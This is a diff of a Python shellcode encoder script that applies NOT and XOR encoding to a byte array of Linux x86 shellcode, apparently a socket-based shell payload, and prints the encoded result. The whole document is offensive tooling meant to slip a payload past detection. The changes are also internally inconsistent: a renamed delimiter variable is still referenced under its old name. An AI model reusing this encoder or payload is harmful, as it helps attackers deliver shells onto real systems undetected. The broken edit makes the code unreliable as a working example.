@@ -41,19 +41,15 @@ shellcode = bytearray(b'\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd
 
 n_encoded = n_encode(shellcode)
 
-not_delimiter = find_unused_byte(n_encoded)
-n_encoded.insert(0, not_delimiter)
-
 xor_byte = find_unused_byte(n_encoded)
 nx_encoded = x_encode(n_encoded)
 
-xor_delimiter = find_unused_byte(nx_encoded)
+delimiter = find_unused_byte(nx_encoded)
 nx_encoded.append(xor_delimiter)
 
 formatted_shellcode = format_shellcode(nx_encoded)
 
 print('Length: %d' % len(nx_encoded))
-print('XOR Delimiter: ' + hex(xor_delimiter))
+print('XOR Delimiter: ' + hex(delimiter))
 print('XOR Byte: ' + hex(xor_byte))
-print('NOT Delimiter Byte: ' + hex(not_delimiter))
 print(formatted_shellcode)
